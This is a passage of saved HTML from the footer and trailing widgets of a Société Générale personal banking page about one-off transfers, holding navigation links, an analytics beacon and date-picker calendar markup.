   <svg class="dcw_dropdown_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#arrow-dropdown"></use></svg>
    <ul class="dcw_dropdown_list toggle_content">
            <li class="dcw_dropdown_item">
                <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://www.privatebanking.societegenerale.fr/" data-tms-click-type="N" data-tms-element-label="banque-privée">Banque privée</a>
            </li>
            <li class="dcw_dropdown_item">
                <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://professionnels.societegenerale.fr/" data-tms-click-type="N" data-tms-element-label="professionnels">Professionnels</a>
            </li>
            <li class="dcw_dropdown_item">
                <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://entreprises.societegenerale.fr/" data-tms-click-type="N" data-tms-element-label="entreprises">Entreprises</a>
            </li>
            <li class="dcw_dropdown_item">
                <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://associations.societegenerale.fr/" data-tms-click-type="N" data-tms-element-label="associations">Associations</a>
            </li>
            <li class="dcw_dropdown_item">
                <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://www.societegenerale.com/fr/accueil" data-tms-click-type="N" data-tms-element-label="groupe-société-générale">Groupe Société Générale</a>
            </li>
    </ul>
</div></li>
					</ul>
			</nav>
			<ul class="dcw_footer_container dcw_footer-second_social">
				    <li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Facebook" href="https://www.facebook.com/societegenerale.france/" aria-label="Voir le groupe Facebook de la Société Générale" data-tms-click-type="N" data-tms-element-label="facebook">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#facebook-2"></use></svg>
</a>    </li>
    <li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Twitter" href="https://twitter.com/sg_etvous" aria-label="Voir le Twitter de la Société Générale" data-tms-click-type="N" data-tms-element-label="twitter">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#twitter-2"></use></svg>
</a>    </li>
    <li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Instagram" href="https://www.instagram.com/societegenerale/?hl=fr" aria-label="Voir l' Instagram de la Société Générale" data-tms-click-type="N" data-tms-element-label="instagram">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#instagram"></use></svg>
</a>    </li>
</ul>
		</div>
	</div>
	<nav class="dcw_footer-third">
		<div class="dcw_footer_container">
			<img alt="Société Générale" aria-hidden="true" class="dcw_footer-third_logo" src="/static/Resources/img/logo/logo-sg-seul.svg" width="150" height="30">
<ul class="dcw_footer-third_list">
				    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="/tous-nos-tarifs" data-tms-click-type="N" data-tms-element-label="tarifs">Tarifs</a>
    </li>
    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="/engagements" data-tms-click-type="N" data-tms-element-label="nos-engagements">Nos engagements</a>
    </li>
    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="/informations-mentions-legales" data-tms-click-type="N" data-tms-element-label="informations-légales">Informations légales</a>
    </li>
    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="/charte-cookies-societe-generale" data-tms-click-type="N" data-tms-element-label="charte-cookies">Charte Cookies</a>
    </li>
    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="/securite" data-tms-click-type="N" data-tms-element-label="sécurité">Sécurité</a>
    </li>
    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="/engagements/gestion-donnees-personnelles-rgpd" data-tms-click-type="N" data-tms-element-label="données-personnelles">Données personnelles</a>
    </li>
</ul>
		</div>
	</nav>
	</footer>
<!-- URL: https://particuliers.societegenerale.fr:80/restcontent/regions/0810a9651a991610VgnVCM100000050012acRCRD -->
<!-- REQUEST PROFILE: null, REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: 0810a9651a991610VgnVCM100000050012acRCRD, regionNames: gb2-com3-int,gb2-com2-int,gb2-com4-int,footer-int-without-closing-main, FURL_NAME: /aconec/cptbud/virmts/virmtu/footer, FURL_ID: 6290a9651a991610VgnVCM100000050012acRCRD -->













<div id="interactWrapper" class="sdcwrapper"></div>
<!-- <iframe style="height: 0px; width: 0px; border: 0px none;" id="dmp_bridge_iframe" sandbox="allow-scripts allow-same-origin" src="https://static.societegenerale.fr/pri/static/dmsa/iframe/dmp_bridge.html#console=true&amp;kruxenvname=socgenprod&amp;kruxcontroltagid=Kw6K3cJw&amp;parenthostname=https://particuliers.societegenerale.fr&amp;id=dmp_bridge_iframe" width="0" height="0"></iframe> -->
<div style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.8113073555858867"><img style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.49221444060133" alt="" src="https://bat.bing.com/action/0?ti=5500232&amp;Ver=2&amp;mid=309625e8-009c-34ab-3886-faefeca86f00&amp;sid=809f0102-399d-8e0f-84f4-a8a7c9cda3c7&amp;pi=0&amp;lg=en-US&amp;sw=1482&amp;sh=778&amp;sc=24&amp;tl=Virements%20ponctuels&amp;p=https%3A%2F%2Fparticuliers.societegenerale.fr%2Fcom%2Ficd-web%2Fvupri%2Fvirement.html&amp;r=https%3A%2F%2Fparticuliers.societegenerale.fr%2Ficd%2Fgkb%2Fcaracteristiques-carte-authsec.html&amp;lt=1267&amp;evt=pageLoad&amp;msclkid=N&amp;sv=1&amp;rn=323400" width="0" height="0"></div><div class="flatpickr-calendar animate showTimeInput" tabindex="-1"><div class="flatpickr-months"><span class="flatpickr-prev-month"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 17 17"><g></g><path d="M5.207 8.471l7.146 7.147-0.707 0.707-7.853-7.854 7.854-7.853 0.707 0.707-7.147 7.146z"></path></svg></span><div class="flatpickr-month"><div class="flatpickr-current-month"><select class="flatpickr-monthDropdown-months" tabindex="-1"><option class="flatpickr-monthDropdown-month" value="0" tabindex="-1">janvier</option><option class="flatpickr-monthDropdown-month" value="1" tabindex="-1">février</option><option class="flatpickr-monthDropdown-month" value="2" tabindex="-1">mars</option><option class="flatpickr-monthDropdown-month" value="3" tabindex="-1">avril</option><option class="flatpickr-monthDropdown-month" value="4" tabindex="-1">mai</option><option class="flatpickr-monthDropdown-month" value="5" tabindex="-1">juin</option><option class="flatpickr-monthDropdown-month" value="6" tabindex="-1">juillet</option><option class="flatpickr-monthDropdown-month" value="7" tabindex="-1">août</option><option class="flatpickr-monthDropdown-month" value="8" tabindex="-1">septembre</option><option class="flatpickr-monthDropdown-month" value="9" tabindex="-1">octobre</option><option class="flatpickr-monthDropdown-month" value="10" tabindex="-1">novembre</option><option class="flatpickr-monthDropdown-month" value="11" tabindex="-1">décembre</option></select><div class="numInputWrapper"><input class="numInput cur-year" type="number" tabindex="-1" aria-label="Year"><span class="arrowUp"></span><span class="arrowDown"></span></div></div></div><span class="flatpickr-next-month"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 17 17"><g></g><path d="M13.207 8.472l-7.854 7.854-0.707-0.707 7.146-7.146-7.146-7.148 0.707-0.707 7.854 7.854z"></path></svg></span></div><div class="flatpickr-innerContainer"><div class="flatpickr-rContainer"><div class="flatpickr-weekdays"><div class="flatpickr-weekdaycontainer">
      <span class="flatpickr-weekday">
        lun</span><span class="flatpickr-weekday">mar</span><span class="flatpickr-weekday">mer</span><span class="flatpickr-weekday">jeu</span><span class="flatpickr-weekday">ven</span><span class="flatpickr-weekday">sam</span><span class="flatpickr-weekday">dim
      </span>
      </div></div><div class="flatpickr-days" tabindex="-1"><div class="dayContainer"><span class="flatpickr-day prevMonthDay flatpickr-disabled" aria-label="27 avril 2020">27</span><span class="flatpickr-day prevMonthDay flatpickr-disabled" aria-label="28 avril 2020">28</span><span class="flatpickr-day prevMonthDay flatpickr-disabled" aria-label="29 avril 2020">29</span><span class="flatpickr-day prevMonthDay flatpickr-disabled" aria-label="30 avril 2020">30</span><span class="flatpickr-day flatpickr-disabled" aria-label="1 mai 2020">1</span><span class="flatpickr-day flatpickr-disabled" aria-label="2 mai 2020">2</span><span class="flatpickr-day flatpickr-disabled" aria-label="3 mai 2020">3</span><span class="flatpickr-day flatpickr-disabled" aria-label="4 mai 2020">4</span><span class="flatpickr-day flatpickr-disabled" aria-label="5 mai 2020">5</span><span class="flatpickr-day flatpickr-disabled" aria-label="6 mai 2020">6</span><span class="flatpickr-day flatpickr-disabled" aria-label="7 mai 2020">7</span><span class="flatpickr-day flatpickr-disabled" aria-label="8 mai 2020">8</span><span class="flatpickr-day today flatpickr-disabled" aria-label="9 mai 2020" aria-current="date">9</span><span class="flatpickr-day flatpickr-disabled" aria-label="10 mai 2020">10</span><span class="flatpickr-day flatpickr-disabled" aria-label="11 mai 2020">11</span><span class="flatpickr-day flatpickr-disabled" aria-label="12 mai 2020">12</span><span class="flatpickr-day selected" aria-label="13 mai 2020" tabindex="-1">13</span><span class="flatpickr-day " aria-label="14 mai 2020" tabindex="-1">14</span><span class="flatpickr-day " aria-label="15 mai 2020" tabindex="-1">15</span><span class="flatpickr-day " aria-label="16 mai 2020" tabindex="-1">16</span><span class="flatpickr-day " aria-label="17 mai 2020" tabindex="-1">17</span><span class="flatpickr-day " aria-label="18 mai 2020" tabindex="-1">18</span><span class="flatpickr-day " aria-label="19 mai 2020" tabindex="-1">19</span><span class="flatpickr-day " aria-label="20 mai 2020" tabindex="-1">20</span><span class="flatpickr-day " aria-label="21 mai 2020" tabindex="-1">21</span><span class="flatpickr-day " aria-label="22 mai 2020" tabindex="-1">22</span><span class="flatpickr-day " aria-label="23 mai 2020" tabindex="-1">23</span><span class="flatpickr-day " aria-label="24 mai 2020" tabindex="-1">24</span><span class="flatpickr-day " aria-label="25 mai 2020" tabindex="-1">25</span><span class="flatpickr-day " aria-label="26 mai 2020" tabindex="-1">26</span><span class="flatpickr-day " aria-label="27 mai 2020" tabindex="-1">27</span><span class="flatpickr-day " aria-label="28 mai 2020" tabindex="-1">28</span><span class="flatpickr-day " aria-label="29 mai 2020" tabindex="-1">29</span><span class="flatpickr-day " aria-label="30 mai 2020" tabindex="-1">30</span><span class="flatpickr-day " aria-label="31 mai 2020" tabindex="-1">31</span><span class="flatpickr-day nextMonthDay" aria-label="1 juin 2020" tabindex="-1">1</span><span class="flatpickr-day nextMonthDay" aria-label="2 juin 2020" tabindex="-1">2</span><span class="flatpickr-day nextMonthDay" aria-label="3 juin 2020" tabindex="-1">3</span><span class="flatpickr-day nextMonthDay" aria-label="4 juin 2020" tabindex="-1">4</span><span class="flatpickr-day nextMonthDay" aria-label="5 juin 2020" tabindex="-1">5</span><span class="flatpickr-day nextMonthDay" aria-label="6 juin 2020" tabindex="-1">6</span><span class="flatpickr-day nextMonthDay" aria-label="7 juin 2020" tabindex="-1">7</span></div></div></div></div></div><div class="flatpickr-calendar animate showTimeInput" tabindex="-1"><div class="flatpickr-months"><span class="flatpickr-prev-month"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 17 17"><g></g><path d="M5.207 8.471l7.146 7.147-0.707 0.707-7.853-7.854 7.854-7.853 0.707 0.707-7.147 7.146z"></path></svg></span><div class="flatpickr-month"><div class="flatpickr-current-month"><select class="flatpickr-monthDropdown-months" tabindex="-1"><option class="flatpickr-monthDropdown-month" value="0" tabindex="-1">janvier</option><option class="flatpickr-monthDropdown-month" value="1" tabindex="-1">février</option><option class="flatpickr-monthDropdown-month" value="2" tabindex="-1">mars</option><option class="flatpickr-monthDropdown-month" value="3" tabindex="-1">avril</option><option class="flatpickr-monthDropdown-month" value="4" tabindex="-1">mai</option><option class="flatpickr-monthDropdown-month" value="5" tabindex="-1">juin</option><option class="flatpickr-monthDropdown-month" value="6" tabindex="-1">juillet</option><option class="flatpickr-monthDropdown-month" value="7" tabindex="-1">août</option><option class="flatpickr-monthDropdown-month" value="8" tabindex="-1">septembre</option><option class="flatpickr-monthDropdown-month" value="9" tabindex="-1">octobre</option><option class="flatpickr-monthDropdown-month" value="10" tabindex="-1">novembre</option><option class="flatpickr-monthDropdown-month" value="11" tabindex="-1">décembre</option></select><div class="numInputWrapper"><input class="numInput cur-year" type="number" tabindex="-1" aria-label="Year"><span class="arrowUp"></span><span class="arrowDown"></span></div></div></div><span class="flatpickr-next-month"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 17 17"><g></g><path d="M13.207 8.472l-7.854 7.854-0.707-0.707 7.146-7.146-7.146-7.148 0.707-0.707 7.854 7.854z"></path></svg></span></div><div class="flatpickr-innerContainer"><div class="flatpickr-rContainer"><div class="flatpickr-weekdays"><div class="flatpickr-weekdaycontainer">
      <span class="flatpickr-weekday">
        lun</span><span class="flatpickr-weekday">mar</span><span class="flatpickr-weekday">mer</span><span class="flatpickr-weekday">jeu</span><span class="flatpickr-weekday">ven</span><span class="flatpickr-weekday">sam</span><span class="flatpickr-weekday">dim
      </span>
      </div></div><div class="flatpickr-days" tabindex="-1"><div class="dayContainer"><span class="flatpickr-day prevMonthDay flatpickr-disabled" aria-label="27 avril 2020">27</span><span class="flatpickr-day prevMonthDay flatpickr-disabled" aria-label="28 avril 2020">28</span><span class="flatpickr-day prevMonthDay flatpickr-disabled" aria-label="29 avril 2020">29</span><span class="flatpickr-day prevMonthDay flatpickr-disabled" aria-label="30 avril 2020">30</span><span class="flatpickr-day flatpickr-disabled" aria-label="1 mai 2020">1</span><span class="flatpickr-day flatpickr-disabled" aria-label="2 mai 2020">2</span><span class="flatpickr-day flatpickr-disabled" aria-label="3 mai 2020">3</span><span class="flatpickr-day flatpickr-disabled" aria-label="4 mai 2020">4</span><span class="flatpickr-day flatpickr-disabled" aria-label="5 mai 2020">5</span><span class="flatpickr-day flatpickr-disabled" aria-label="6 mai 2020">6</span><span class="flatpickr-day flatpickr-disabled" aria-label="7 mai 2020">7</span><span class="flatpickr-day flatpickr-disabled" aria-label="8 mai 2020">8</span><span class="flatpickr-day today flatpickr-disabled" aria-label="9 mai 2020" aria-current="date">9</span><span class="flatpickr-day flatpickr-disabled" aria-label="10 mai 2020">10</span><span class="flatpickr-day selected" aria-label="11 mai 2020" tabindex="-1">11</span><span class="flatpickr-day " aria-label="12 mai 2020" tabindex="-1">12</span><span class="flatpickr-day " aria-label="13 mai 2020" tabindex="-1">13</span><span class="flatpickr-day " aria-label="14 mai 2020" tabindex="-1">14</span><span class="flatpickr-day " aria-label="15 mai 2020" tabindex="-1">15</span><span class="flatpickr-day " aria-label="16 mai 2020" tabindex="-1">16</span><span class="flatpickr-day " aria-label="17 mai 2020" tabindex="-1">17</span><span class="flatpickr-day " aria-label="18 mai 2020" tabindex="-1">18</span><span class="flatpickr-day " aria-label="19 mai 2020" tabindex="-1">19</span><span class="flatpickr-day " aria-label="20 mai 2020" tabindex="-1">20</span><span class="flatpickr-day " aria-label="21 mai 2020" tabindex="-1">21</span><span class="flatpickr-day " aria-label="22 mai 2020" tabindex="-1">22</span><span class="flatpickr-day " aria-label="23 mai 2020" tabindex="-1">23</span><span class="flatpickr-day " aria-label="24 mai 2020" tabindex="-1">24</span><span class="flatpickr-day " aria-label="25 mai 2020" tabindex="-1">25</span><span class="flatpickr-day " aria-label="26 mai 2020" tabindex="-1">26</span><span class="flatpickr-day " aria-label="27 mai 2020" tabindex="-1">27</span><span class="flatpickr-day " aria-label="28 mai 2020" tabindex="-1">28</span><span class="flatpickr-day " aria-label="29 mai 2020" tabindex="-1">29</span><span class="flatpickr-day " aria-label="30 mai 2020" tabindex="-1">30</span><span class="flatpickr-day " aria-label="31 mai 2020" tabindex="-1">31</span><span class="flatpickr-day nextMonthDay" aria-label="1 juin 2020" tabindex="-1">1</span><span class="flatpickr-day nextMonthDay" aria-label="2 juin 2020" tabindex="-1">2</span><span class="flatpickr-day nextMonthDay" aria-label="3 juin 2020" tabindex="-1">3</span><span class="flatpickr-day nextMonthDay" aria-label="4 juin 2020" tabindex="-1">4</span><span class="flatpickr-day nextMonthDay" aria-label="5 juin 2020" tabindex="-1">5</span><span class="flatpickr-day nextMonthDay" aria-label="6 juin 2020" tabindex="-1">6</span><span class="flatpickr-day nextMonthDay" aria-label="7 juin 2020" tabindex="-1">7</span></div></div></div></div></div><div id="mfbNavbar" class="mfbNavbar mfbHidden  mfbSlide-in-bottom mfbVisible" style="margin-bottom: -10px;"><div id="mfbNavbarClose" title="Close/Fermer" mfb-click="1">×</div><div id="mfbNavbarContent" class="mfbNavbarContent" style="line-height: 50px;"><button id="mfbButton" style="" mfb-click="1"><div style="font-size:inherit;font-weight:inherit;text-align:inherit;"><span style="margin-right:5px;"><svg width="20px" height="17px" viewBox="0 0 14.142 14.142" style="vertical-align:-15%;" fill="#ffffff"><path d="M7.071,0C3.166,0,0,3.166,0,7.071s3.166,7.071,7.071,7.071s7.071-3.166,7.071-7.071S10.976,0,7.071,0z M6.96,11.511c-0.676,0-1.135-0.498-1.135-1.161c0-0.677,0.472-1.161,1.135-1.161c0.689,0,1.136,0.484,1.148,1.161C8.108,11.013,7.649,11.511,6.96,11.511z M8.504,6.765c-0.472,0.522-0.663,1.021-0.65,1.594v0.23H6.158L6.145,8.257C6.107,7.606,6.324,6.943,6.897,6.254c0.409-0.485,0.741-0.893,0.741-1.327c0-0.447-0.294-0.74-0.933-0.766c-0.42,0-0.931,0.153-1.263,0.383L5.008,3.153C5.467,2.885,6.233,2.63,7.139,2.63c1.684,0,2.45,0.931,2.45,1.991C9.589,5.591,8.989,6.229,8.504,6.765z"></path></svg></span><span>Votre avis</span></div></button></div></div></body></html>